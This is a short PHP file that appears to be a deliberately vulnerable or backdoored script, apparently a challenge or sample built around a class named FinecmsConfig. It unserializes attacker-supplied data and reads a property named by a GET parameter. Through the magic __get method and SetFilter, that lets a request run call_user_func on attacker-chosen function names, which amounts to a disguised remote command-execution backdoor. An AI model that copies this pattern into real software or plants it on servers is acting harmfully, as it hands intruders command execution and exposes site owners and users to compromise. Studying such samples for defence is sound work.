<?php


$config = unserialize(base64_decode($config));
if(isset($_GET['param'])){
    $config->$_GET['param'];
}
class FinecmsConfig{
    private $config;
    private $path;
    public $filter;
    public function __construct($config=""){
        $this->config = $config;
        echo 123;
    }
    public function getConfig(){
        if($this->config == ""){
            $config = isset($_POST['Finecmsconfig'])?$_POST['Finecmsconfig']:"";
        }
    }
    public function SetFilter($value){
        
        if($this->filter){
            foreach($this->filter as $filter){

                
                $array = is_array($value)?array_map($filter,$value):call_user_func($filter,$value);
            }
            $this->filter = array();
        }else{
            return false;
        }
        return true;
    }
    public function __get($key){
        $this->SetFilter($key);
        die("");
    }
}



